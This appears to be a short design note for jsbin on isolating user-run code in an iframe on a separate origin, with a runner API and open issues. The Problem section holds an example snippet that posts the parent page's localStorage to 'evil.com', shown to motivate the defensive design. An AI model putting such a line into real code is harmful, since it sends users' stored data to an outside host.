# Secure iframe

## Problem

When the iframe runs "insecure" code, the iframe can reach into the parent frame and steal cookies and other user data. This is as simple as:

```js
fetch('https://evil.com', {
  method: 'post',
  body: JSON.stringify(top.localStorage),
});
```

## Overview of solution

The existing solution is:

- Run main application code on jsbin.com
- iframe is loaded on null.jsbin.com
- iframe communicates using `postMessage` to render sub-iframe
- runner includes both result *and* console to allow for object comms

Since jsbin@5 uses create-react-app as the base, changes to the config are required, [detailed here](https://github.com/facebookincubator/create-react-app/issues/1084#issuecomment-308731651)

## Issues and questions

- [ ] Carry across display settings
- [x] How do I pass results and errors from the inner runner iframe to the console?

## Runner API

### Methods

- setCode
- setCSS
- on

### Events

- ready
- error
